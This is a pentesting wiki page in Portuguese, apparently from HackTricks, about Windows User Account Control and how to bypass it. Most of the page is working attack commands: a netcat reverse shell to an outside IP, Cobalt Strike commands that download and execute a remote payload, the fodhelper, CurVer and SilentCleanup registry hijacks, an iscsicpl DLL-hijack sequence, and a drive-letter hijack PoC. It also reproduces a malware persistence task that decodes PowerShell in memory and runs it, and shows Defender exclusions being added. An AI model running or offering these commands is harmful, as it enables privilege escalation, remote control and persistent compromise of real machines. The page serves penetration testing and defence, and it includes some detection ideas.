# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) é um recurso que habilita um **prompt de consentimento para atividades elevadas**. Os aplicativos têm diferentes níveis de `integrity`, e um programa com **nível alto** pode executar tarefas que **poderiam comprometer o sistema**. Quando o UAC está habilitado, aplicativos e tarefas sempre **são executados no contexto de segurança de uma conta não administradora**, a menos que um administrador autorize explicitamente esses aplicativos/tarefas a terem acesso de nível administrativo ao sistema para serem executados. É um recurso de conveniência que protege os administradores contra alterações não intencionais, mas não é considerado um limite de segurança.<sup>[[2]](#references)</sup>

Para mais informações sobre níveis de integridade:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Quando o UAC está em vigor, um usuário administrador recebe 2 tokens: um token de usuário padrão, para executar ações regulares com integridade média, e outro com os privilégios de administrador.

Esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) explica em grande profundidade como o UAC funciona e inclui o processo de logon, a experiência do usuário e a arquitetura do UAC.<sup>[[2]](#references)</sup> Os administradores podem usar políticas de segurança para configurar como o UAC funciona especificamente para sua organização no nível local (usando secpol.msc), ou configurar e distribuir essas políticas por meio de Group Policy Objects (GPO) em um ambiente de domínio do Active Directory. As várias configurações são discutidas em detalhes [aqui](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Existem 10 configurações de Group Policy que podem ser definidas para o UAC. A tabela a seguir fornece detalhes adicionais:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Políticas para instalar software no Windows

As **políticas de segurança locais** ("secpol.msc" na maioria dos sistemas) são configuradas por padrão para **impedir que usuários não administradores realizem instalações de software**. Isso significa que, mesmo que um usuário não administrador possa baixar o instalador do seu software, ele não poderá executá-lo sem uma conta de administrador.

### Chaves do Registro para forçar o UAC a solicitar elevação

Como usuário padrão sem direitos de administrador, você pode garantir que a conta "padrão" seja **solicitada a fornecer credenciais pelo UAC** quando tentar realizar determinadas ações. Isso exigiria modificar determinadas **chaves do Registro**, para as quais são necessárias permissões de administrador, a menos que exista um **UAC bypass** ou o atacante já esteja conectado como administrador.

Mesmo que o usuário esteja no grupo **Administrators**, essas alterações forçam o usuário a **inserir novamente as credenciais da conta** para realizar ações administrativas.

**Na prática, isso só é útil quando você já possui um token elevado, um UAC bypass ou uma misconfiguration que permita alterar essas chaves; caso contrário, a própria gravação no Registro será bloqueada.**

As chaves e entradas do Registro que você deve alterar são as seguintes (com seus valores padrão entre parênteses):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Isso também pode ser feito manualmente por meio da ferramenta Local Security Policy. Depois de alteradas, as operações administrativas solicitam que o usuário insira novamente suas credenciais.

### Observação

**O User Account Control não é um limite de segurança.** Portanto, usuários padrão não podem escapar de suas contas e obter direitos de administrador sem um exploit de escalada de privilégios local.

### Solicitar 'acesso total ao computador' a um usuário
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- O Internet Explorer Protected Mode usa verificações de integridade para impedir que processos com nível de integridade alto (como navegadores web) acessem dados com nível de integridade baixo (como a pasta de arquivos temporários da Internet). Isso é feito executando o navegador com um token de baixa integridade. Quando o navegador tenta acessar dados armazenados na zona de baixa integridade, o sistema operacional verifica o nível de integridade do processo e permite o acesso adequadamente. Esse recurso ajuda a impedir que ataques de execução remota de código obtenham acesso a dados sensíveis no sistema.
- Quando um usuário faz logon no Windows, o sistema cria um token de acesso que contém uma lista dos privilégios do usuário. Os privilégios são definidos como a combinação dos direitos e capacidades de um usuário. O token também contém uma lista das credenciais do usuário, usadas para autenticá-lo no computador e em recursos da rede.

### Autoadminlogon

Para configurar o Windows para fazer logon automaticamente com um usuário específico na inicialização, defina a **`AutoAdminLogon registry key`**. Isso é útil em ambientes de quiosque ou para fins de teste. Use isso somente em sistemas seguros, pois a senha ficará exposta no registro.

Defina as seguintes chaves usando o Registry Editor ou `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Para restaurar o comportamento normal de logon, defina `AutoAdminLogon` como 0.

## UAC bypass

> [!TIP]
> Observe que, se você tiver acesso gráfico à vítima, o UAC bypass é simples, pois basta clicar em "Yes" quando o prompt do UAC aparecer

O UAC bypass é necessário na seguinte situação: **o UAC está ativado, seu processo está sendo executado em um contexto de integridade média e seu usuário pertence ao grupo de administradores**.

É importante mencionar que é **muito mais difícil fazer o bypass do UAC quando ele está no nível de segurança mais alto (Always) do que quando está em qualquer um dos outros níveis (Default).**

### Fast triage from a medium-integrity shell

Antes de tentar um bypass, confirme que você está no cenário correto e associe o build do host a métodos conhecidos que funcionam:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Notas práticas:
- Se `EnableLUA=0`, você não precisa de um bypass: qualquer token de administrador pode solicitar diretamente alta integridade.
- `ConsentPromptBehaviorAdmin=2` ou `5` é o cenário comum para bypasses de auto-elevate / baseados em COM.
- `Always Notify` aumenta a dificuldade, mas você ainda deve testar a build exata em vez de presumir uma falha: o UACME ainda acompanha alguns métodos `AlwaysNotify compatible` em builds modernas do Windows.<sup>[[3]](#references)</sup>

### UAC desabilitado

Se o UAC já estiver desabilitado (`ConsentPromptBehaviorAdmin` for **`0`**), você pode **executar um reverse shell com privilégios de administrador** (nível de integridade alta) usando algo como:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass com duplicação de token

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Muito** Basic UAC "bypass" (acesso completo ao sistema de arquivos)

Se você tiver um shell com um usuário que esteja dentro do grupo Administrators, poderá **montar o compartilhamento C$** via SMB (sistema de arquivos) localmente em um novo disco e terá **acesso a tudo dentro do sistema de arquivos** (incluindo a pasta home do Administrator).

> [!WARNING]
> **Parece que esse truque não está mais funcionando**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Bypass de UAC com cobalt strike

As técnicas do Cobalt Strike só funcionarão se o UAC não estiver configurado no nível máximo de segurança
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** e **Metasploit** também têm vários módulos para **bypass** do **UAC**.

### Interfaces COM elevadas (`ICMLuaUtil` / `CMSTPLUA`)

Objetos COM autoelevados continuam sendo uma superfície prática do UAC em builds modernos. O `ICMLuaUtil` ainda é acompanhado pelo UACME como funcional nas versões atuais do Windows, e as ferramentas ofensivas continuam adaptando o `CMSTPLUA` combinando um processo na área de trabalho interativa, execução em 64 bits e, às vezes, masquerading do PEB/processo antes de invocar o COM Elevation Moniker.<sup>[[3]](#references)</sup>

Dicas práticas:
- Prefira um processo de **64 bits** na **sessão interativa** do usuário (comumente `explorer.exe` ou um filho dele).
- Se um shell bruto falhar, tente novamente a partir de uma implementação BOF / UACME em vez de um wrapper ingênuo de `CreateProcess`.
- Espere que a execução do processo filho ocorra em um **processo elevado separado**; muitos BOFs não elevam o beacon atual in-place.

### KRBUACBypass

Documentação e ferramenta em [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits de bypass do UAC

[**UACME** ](https://github.com/hfiref0x/UACME), que é uma **compilação** de vários exploits de bypass do UAC. Observe que será necessário **compilar o UACME usando o Visual Studio ou o msbuild**. A compilação criará vários executáveis (como `Source\Akagi\outout\x64\Debug\Akagi.exe`); você precisará saber **qual deles deve usar.**<sup>[[3]](#references)</sup>\
Você deve **ter cuidado**, pois alguns bypasses **exibirão prompts de outros programas** que **alertarão** o **usuário** de que algo está acontecendo.<sup>[[3]](#references)</sup>

O UACME possui a **versão de build a partir da qual cada técnica começou a funcionar**.<sup>[[3]](#references)</sup> Você pode pesquisar uma técnica que afete suas versões:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Além disso, usando [esta](https://en.wikipedia.org/wiki/Windows_10_version_history) página, você obtém a versão do Windows `1607` a partir das versões de build.

Um workflow prático consiste em primeiro **avaliar a build do host** e só então executar o método correspondente:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` compara rapidamente o build local com seus métodos de UAC conhecidos, o que é útil para descartar PoCs obsoletos rapidamente.<sup>[[4]](#references)</sup>
- `UACME` continua sendo o melhor catálogo público para associar um bypass a um build específico. As versões recentes adicionaram novos métodos e testaram novamente os existentes no **Windows 11 25H2**, portanto verifique novamente o README/notas de versão antes de presumir que uma publicação antiga ainda se aplica sem alterações.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

O binário confiável `fodhelper.exe` é autoelevado nas versões modernas do Windows. Quando iniciado, ele consulta o caminho do Registro por usuário abaixo sem validar o verbo `DelegateExecute`. Plantar um comando nesse local permite que um processo de Medium Integrity (o usuário pertence ao grupo Administrators) inicie um processo de High Integrity sem um prompt do UAC.

Caminho do Registro consultado pelo fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Etapas do PowerShell (defina seu payload e então acione)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notas:
- Funciona quando o usuário atual é membro de Administrators e o nível do UAC é padrão/flexível (não Always Notify com restrições adicionais).
- Use o caminho `sysnative` para iniciar um PowerShell de 64 bits a partir de um processo de 32 bits no Windows de 64 bits.
- O Payload pode ser qualquer comando (PowerShell, cmd ou um caminho de EXE). Evite UIs que solicitem interação para manter a discrição.

#### Variante de hijack de CurVer/extension (somente HKCU)

Amostras recentes que abusam do `fodhelper.exe` evitam `DelegateExecute` e, em vez disso, **redirecionam o ProgID `ms-settings`** por meio do valor `CurVer` específico do usuário. O binário autoelevado ainda resolve o handler em `HKCU`, portanto nenhum token de admin é necessário para plantar as chaves:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Uma vez com privilégios elevados, o **malware** geralmente **desativa solicitações futuras** definindo `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` como `0` e, em seguida, realiza evasão de defesa adicional (por exemplo, `Add-MpPreference -ExclusionPath C:\ProgramData`) e recria a persistência para ser executado com alta integridade. Uma tarefa de persistência típica armazena no disco um **script PowerShell criptografado com XOR** e o decodifica/executa na memória a cada hora:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Esta variante ainda limpa o **dropper** e deixa apenas os payloads em estágios, fazendo com que a detecção dependa do monitoramento do hijack de **`CurVer`**, da adulteração de `ConsentPromptBehaviorAdmin`, da criação de exclusões no Defender ou de tarefas agendadas que descriptografam o PowerShell em memória.<sup>[[5]](#references)</sup>

### UAC bypass via tarefa `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` inicia o `cleanmgr.exe` com privilégios máximos e expande `%windir%` a partir do ambiente do usuário. Se você controlar `HKCU\Environment\windir`, poderá redirecionar essa expansão para um comando arbitrário e obter alta integridade sem uma caixa de diálogo de consentimento.<sup>[[8]](#references)</sup> Ainda vale a pena testar esse método em builds recentes, porque o UACME mantém a técnica ativa e o acompanhamento de problemas recentes indica que o Windows 11 24H2 pode exigir apenas pequenos ajustes nas aspas.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Se a tarefa colocar o caminho entre aspas nessa build, tente novamente com o payload terminando em uma aspa (por exemplo, `cmd.exe"`). Sempre limpe `HKCU\Environment\windir` após os testes.

#### More UAC bypass

Muitos UAC bypass clássicos que exploram fluxos de UI, objetos COM ou interação com o desktop exigem uma **full interactive session** com a vítima; um shell comum de `nc.exe` ou um serviço executado na **Session 0** geralmente não é suficiente.

Frequentemente, você pode resolver isso usando uma sessão **meterpreter**. Faça a migração para um **process** que tenha o valor de **Session** igual a **1**:

![Point ms-settings to a custom extension (.thm) and map that extension to our payload - More UAC bypass: You can get using a meterpreter session. Migrate to a process that has the Session...](<../../images/image (863).png>)

(_explorer.exe_ deve funcionar)

### UAC Bypass with GUI

Se você tiver acesso a uma **GUI**, basta aceitar o prompt do UAC quando ele aparecer; você realmente não precisa de um bypass técnico. Portanto, obter uma sessão GUI geralmente é suficiente para contornar o atrito prático causado pelo UAC.

Além disso, se você obtiver uma sessão GUI que alguém estava usando (possivelmente via RDP), haverá **algumas ferramentas que estarão sendo executadas como administrador**, a partir das quais você poderá **executar** um **cmd**, por exemplo, **como admin**, diretamente, sem receber outro prompt do UAC, como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Isso pode ser um pouco mais **stealthy**.

### Noisy brute-force UAC bypass

Se você não se importar em ser noisy, sempre poderá **executar algo como** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), que **pede para elevar as permissões até que o usuário aceite**.

### Your own bypass - Basic UAC bypass methodology

Se você observar o **UACME**, perceberá que **muitos UAC bypass exploram DLL hijacking** (geralmente fazendo com que um binário elevado carregue uma DLL controlada pelo atacante a partir de um caminho gravável). [Read this to learn how to find a DLL hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Encontre um binário que faça **autoelevate** (verifique se, quando executado, ele é executado em um nível de integridade alto).
2. Com o procmon, encontre eventos "**NAME NOT FOUND**" que possam ser vulneráveis a **DLL Hijacking**.
3. Provavelmente, você precisará **escrever** a DLL dentro de alguns **protected paths** (como C:\Windows\System32), nos quais você não tem permissões de escrita. Você pode contornar isso usando:
1. **wusa.exe**: Windows 7, 8 e 8.1. Ele permite extrair o conteúdo de um arquivo CAB dentro de protected paths (porque essa ferramenta é executada a partir de um nível de integridade alto).
2. **IFileOperation**: Windows 10.
4. Prepare um **script** para copiar sua DLL para dentro do protected path e executar o binário vulnerável e autoelevated.

### Another UAC bypass technique

Consiste em observar se um **autoElevated binary** tenta **ler** no **registry** o **name/path** de um **binary** ou **command** a ser **executed** (isso é mais interessante se o binário buscar essas informações dentro do **HKCU**).

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

O `C:\Windows\SysWOW64\iscsicpl.exe` de 32 bits é um binário **auto-elevated** que pode ser explorado para carregar `iscsiexe.dll` por search order. Se você puder colocar uma `iscsiexe.dll` maliciosa dentro de uma pasta **user-writable** e modificar o `PATH` do usuário atual (por exemplo, via `HKCU\Environment\Path`) para que essa pasta seja pesquisada, o Windows poderá carregar a DLL do atacante dentro do processo elevado `iscsicpl.exe` **sem exibir um prompt do UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Observações práticas:
- Isso é útil quando o usuário atual pertence ao grupo **Administrators**, mas está executando com **Medium Integrity** devido ao UAC.
- A cópia em **SysWOW64** é a relevante para este bypass. Trate a cópia em **System32** como um binário separado e valide o comportamento de forma independente.
- A primitive é uma combinação de **auto-elevation** e **DLL search-order hijacking**; portanto, o mesmo fluxo de trabalho com o ProcMon usado para outros UAC bypass é útil para validar o carregamento da DLL ausente.

Fluxo mínimo:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ideias de detecção:
- Gerar um alerta para `reg add` / gravações no registro em `HKCU\Environment\Path` imediatamente seguidas pela execução de `C:\Windows\SysWOW64\iscsicpl.exe`.
- Procurar por `iscsiexe.dll` em locais **controlados pelo usuário**, como `%TEMP%` ou `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Correlacionar a execução de `iscsicpl.exe` com processos filhos inesperados ou carregamentos de DLL de fora dos diretórios normais do Windows.

### Pesquisas mais recentes que vale a pena verificar separadamente

Algumas chains posteriores a 2024 já não se parecem com os clássicos registry hijacks de `HKCU\Software\Classes`. Por exemplo, o activation-context cache poisoning pode encadear um **drive remap** e um **DLL redirection** para passar de integridade média para alta por meio de trusted UI / auto-elevated binaries, como `ctfmon.exe`, e posteriormente alvos como `fodhelper.exe`. Em vez de duplicar o grande PoC aqui, verifique os exemplos compactos de payloads em:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Hijack da letra da unidade do Administrator Protection (25H2) por meio do per-logon-session DOS device map

Para obter a superfície de ataque completa de `RAiLaunchAdminProcess` / UIAccess no Windows 11 25H2, consulte a página dedicada:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

O “Administrator Protection” do Windows 11 25H2 usa shadow-admin tokens com mapas `\Sessions\0\DosDevices/<LUID>` por sessão. O diretório é criado de forma lazy por `SeGetTokenDeviceMap` na primeira resolução de `\??`. Se o atacante personificar o shadow-admin token apenas em **SecurityIdentification**, o diretório será criado com o atacante como **owner** (herdando `CREATOR OWNER`), permitindo drive-letter links que têm precedência sobre `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Etapas:**

1. De uma sessão com poucos privilégios, chame `RAiProcessRunOnce` para iniciar um `runonce.exe` shadow-admin sem prompt.
2. Duplique o primary token para um token de **identificação** e personifique-o enquanto abre `\??`, forçando a criação de `\Sessions\0\DosDevices/<LUID>` sob propriedade do atacante.
3. Crie um symlink `C:` nesse local apontando para um storage controlado pelo atacante; os acessos subsequentes ao filesystem nessa sessão resolverão `C:` para o caminho do atacante, permitindo DLL/file hijack sem um prompt.

**PoC do PowerShell (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Referências

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Como funciona o User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Coleção de técnicas de UAC bypass](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Scanner de compatibilidade e launcher de UAC bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI adota AI para gerar backdoors em PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operação TrueChaos: Exploração de 0-Day contra alvos governamentais do Sudeste Asiático](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Contornando a proteção de administradores do Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – UAC bypass usando a tarefa SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
